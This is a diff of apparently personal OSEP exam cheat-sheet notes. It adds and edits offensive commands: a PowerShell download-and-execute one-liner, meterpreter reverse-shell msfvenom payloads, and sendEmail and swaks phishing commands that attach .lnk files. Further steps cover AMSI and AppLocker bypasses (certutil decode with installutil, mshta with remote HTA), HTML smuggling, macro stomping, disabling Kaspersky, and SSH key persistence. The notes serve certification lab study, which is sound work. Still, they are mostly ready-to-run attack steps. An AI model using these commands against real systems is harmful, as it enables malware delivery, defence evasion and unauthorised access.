@@ -1,7 +1,8 @@
 `https://steflan-security.com/offensive-security-experienced-penetration-tester-osep-review/`
 
 # todo
-- tidy up OSEP code snippets
+- tidy up OSEP code snippets - see # combining the pieces at the bottom
+	- https://github.com/dafthack/HostRecon
 - asciinema prep
 - sectioned shellcode runner
 - html smuggling
@@ -64,28 +65,52 @@ sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/re
 ---
 powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.49.102/run.txt'))
 ```
-
+# phishing email
+## sendemail
+```
+sendEmail -t will@tricky.com -f techsupport@bestcomputers.com -s 192.168.8.131 -u Important Upgrade Instructions -a test.lnk
+Reading message body from STDIN because the '-m' option was not used.
+If you are manually typing in a message:
+  - First line must be received within 60 seconds.
+  - End manual input with a CTRL-D on its own line.
+...
+```
+## swaks
+```
+swaks --to will@tricky.com --from techsupport@bestcomputers.com --header 'Subject: Hello, friend' --body 'Hack the Planet!' --server 192.168.1.11 --attach test.lnk
+```
 # dotnettojscript
-
-Example with process hollowing:
+example with process hollowing:
 ```
 # copy relevant parts of shellcode_process_hollowing/Program.cs to DotNetToJScript/ExampleAssembly/TestClass.cs
 
 # mono build then copy ExampleAssembly.dll
-cd DotNetToJScript/DotNetToJScript/bin/Release
+cd OSEP-Code-Snippets/DotNetToJScript/DotNetToJScript/bin/Release
 cp ../../../ExampleAssembly/bin/Release/ExampleAssembly.dll .
 
+# don't bother using mono to run it on linux you will just get an error
 # on windows dev mount the smb in powershell
-cd Z:\OSEP-Code-Snippets\DotNetToJScript\DotNetToJScript\bin\Release\
-.\DotNetToJScript.exe ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
+net use z: \\192.168.45.246\vscode /user:kali kali
+Z:\OSEP-Code-Snippets\DotNetToJScript\DotNetToJScript\bin\Release\DotNetToJScript.exe Z:\OSEP-Code-Snippets\DotNetToJScript\DotNetToJScript\bin\Release\ExampleAssembly.dll --lang=Jscript --ver=v4 -o demo.js
+
+# copy demo.js back to our kali machine
+copy demo.js z:\
 
 # prepend amsi bypass onto demo.js and transfer to victim
-OSEP-Code-Snippets/bypass_amsi_jscript
+cat OSEP-Code-Snippets/bypass_amsi_jscript/<JSCRIPT_AMSI_BYPASS>.js | xclip -selection clipboard
 ```
+troubleshooting:
+```
+# if you get the compilation error when compiling ExampleAssembly
+'unsafe code may only appear if compiling with unsafe'
 
+Right-click ExampleAssembly > Options > Build > General > Allow 'unsafe' code
+```
+see also: https://github.com/med0x2e/GadgetToJScript
 ## SuperSharpShooter
-
+convert binary payloads to js, vbs and hta
 ```
+git clone https://github.com/SYANiDE-/SuperSharpShooter.git
 cd SuperSharpShooter
 python3 -m venv env
 . ./env/bin/activate
@@ -93,19 +118,23 @@ pip install jsmin colorama
 ---
 msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.49.102 LPORT=443 -e x64/xor_dynamic -b '\\x00\\x0a\\x0d' -f raw  > rawsc.bin
 ./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload js --output test
-```
 
+# prepend amsi bypass onto demo.js and transfer to victim
+cat OSEP-Code-Snippets/bypass_amsi_jscript/<JSCRIPT_AMSI_BYPASS>.js | xclip -selection clipboard
 ```
+custom payload:
+```
+msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x86 --platform windows -e x86/shikata_ga_nai -f raw -o shellcode-encoded.bin -b '\x00'
 msfvenom -p generic/custom PAYLOADFILE=./payload.bin -a x64 --platform windows -e x64/xor_dynamic  -b '\x00\x0a\x0d' -f raw -o rawsc.bin
 ```
-
+see [[#mshta.exe]] for generating a jscript+hta payload that bypasses applocker
 ## html smuggling
-Demo: https://www.youtube.com/watch?v=UucQaVoETSY
-Otherwise: https://github.com/mdsecactivebreach/SharpShooter
-https://portal.offsec.com/courses/pen-300/books-and-videos/modal/modules/client-side-code-execution-with-office/will-you-be-my-dropper/html-smuggling
-
+`OSEP-Code-Snippets/html_smuggling/index.html`
+- generate msfvenom payload and replace value of `var file = ...` 
+- start apache2/http.server
+- email victim pointing to the link
+demo: https://www.youtube.com/watch?v=UucQaVoETSY
 # reflective loading dll
-
 Create a malicious dll with namespace  `ClassLibrary1` and class name `Class1`. Inside `Class1` define your `runner` method.
 ```
 # using simple_shellcode_runner but right-click project file > Options
@@ -118,7 +147,6 @@ $class = $assem.GetType("ClassLibrary1.Class1")
 $method = $class.GetMethod("runner")
 $method.Invoke(0, $null)
 ```
-
 ## reflective loading exe
 ```
 
@@ -129,8 +157,6 @@ PS C:\Windows\Tasks> [rev.Program]::Main("".Split())
 # alternative: without arguments
 PS C:\Windows\Tasks> [rev.Program]::Main()
 ```
-
-
 ## msbuild
 https://github.com/bohops/GhostBuild/blob/master/GhostBuilder.py
 ```
@@ -247,13 +273,11 @@ mono EvilClippy/EvilClippy.exe -s vba.vba lorem_ipsum_stomped.doc
 ```
 
 ## Microsoft Word Stomping
-
 Manual:
 - Use FlexHEX: `Edit > Insert Zero Block`
 - Zero `Module=MyMacro` in `PROJECT`
 - View `_VBA_PROJECT` for microsoft version
 - Zero `Attribut e VB_Nam e...` in MyMacro
-
 Automated:
 ```
 git clone https://github.com/outflanknl/EvilClippy.git
@@ -264,7 +288,7 @@ printf 'Sub sbHello()\nMsgBox "Hello World!"\nEnd Sub' > legit.vba
 cp macro_templates/lorem_ipsum_redux.doc ./lorem_ipsum_stomped.doc
 mono EvilClippy.exe -s legit.vba lorem_ipsum_stomped.doc
 ```
-
+see also: https://github.com/sevagas/macro_pack
 ## Bypass-AMSI
 
 ```
@@ -395,7 +419,7 @@ Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows Defender\Features" -Nam
 Get-MpComputerStatus | select IsTamperProtected
 ```
 
-# applocker bypass
+# applocker
 disable if you have admin: gpedit.msc > make changes > exit > cmd > `gpupdate /force`
 ## alternate data stream
 ```
@@ -406,7 +430,7 @@ type test.js > "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.
 # exploitation
 wscript.exe "C:\Program Files (x86)\TeamViewer\TeamViewer12_Logfile.log:test.js"
 ```
-## powershell runspace via installutil
+## CLM bypass: powershell runspace via installutil
 use this if you come across this error in powershell:
 `Cannot invoke method. Method invocation is supported only on core types in this language mode.`
 - copy `System.Management.Automation.dll` to csharp project folder and edit `applocker_bypass_powershell_runspace.csproj`
@@ -435,6 +459,7 @@ sudo msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/re
 # download, decode and execute; use '&&' instead of ';' for cmd
 certutil -urlcache -split -f "http://192.168.45.168/file.txt"; certutil -decode file.txt bypass.exe; C:\Windows\Microsoft.NET\Framework64\v4.0.30319\installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Tasks\bypass.exe
 ```
+alternative: https://github.com/padovah4ck/PSByPassCLM
 ## bypass for reflective injecting dll
 resource needed: `reflective_dll_injection/Invoke-ReflectivePEInjection.ps1`
 `applocker_bypass_powershell_runspace\Program.cs`
@@ -480,17 +505,25 @@ C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe 
 - if there are arguments eg 'audit' for the Main method you are calling:
 Invoke(0, new object[] { new string[] { "audit" } });
 ```
-
 ## mshta.exe
+`OSEP-Code-Snippets/applocker_bypass_jscript/test.hta`
 ```
-# use OSEP-Code-Snippets/applocker_bypass_jscript/test.hta
-# use sharpshooter to replace placeholder Jscript with shellcode Jscript
+./SuperSharpShooter.py --stageless --dotnetver 4 --rawscfile rawsc.bin --payload jse --output test
+# replace
+...
+var shell = new ActiveXObject("WScript.Shell");
+var res = shell.Run("cmd.exe");
+...
+# with contents of SuperSharpShooter/output/test.js
+cat SuperSharpShooter/output/test.js | xclip -selection clipboard
+
 C:\Windows\System32\mshta.exe \path\to\test.hta
 
-# alternatively create a shortcut
+# in windows: create a shortcut (clickme.lnk) file with the path:
 C:\Windows\System32\mshta.exe http://192.168.49.102\test.hta
-```
 
+# attach to email or soceng victim to click link
+```
 ## XSL
 ```
 # use OSEP-Code-Snippets/applocker_bypass_jscript/test.xsl
@@ -535,7 +568,7 @@ Get-AppLockerPolicy -Effective | Set-AppLockerPolicy -RuleType None
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted -Scope Process
 ```
 
-# bypass network filters
+# network filters
 
 ## generate self-signed certs
 ```
@@ -654,6 +687,11 @@ gcc simpleXORencoder.c -o simpleXORencoder && ./simpleXORencoder
 
 - replace shell code in simpleLoader.c with output of simpleXORencoder; (on victim):
 gcc -o simpleLoader simpleLoader.c -z execstack
+```
+
+```
+# of you have root you can disable kaspersky with:
+sudo kesl-control --stop-t 1
 ```
 ## LD_LIBRARY_PATH
 
@@ -1113,7 +1151,7 @@ ssh-keygen
 cat /home/kali/.ssh/id_rsa.pub | xclip -selection clipboard
 echo "ssh-rsa AAAAB3NzaC1yc2E....ANSzp9EPhk4cIeX8= kali@kali" >> /home/linuxvictim/.ssh/authorized_keys
 ```
-
+### controlmaster
 ```
 # persistence with controlmaster config
 vim ~/.ssh/config
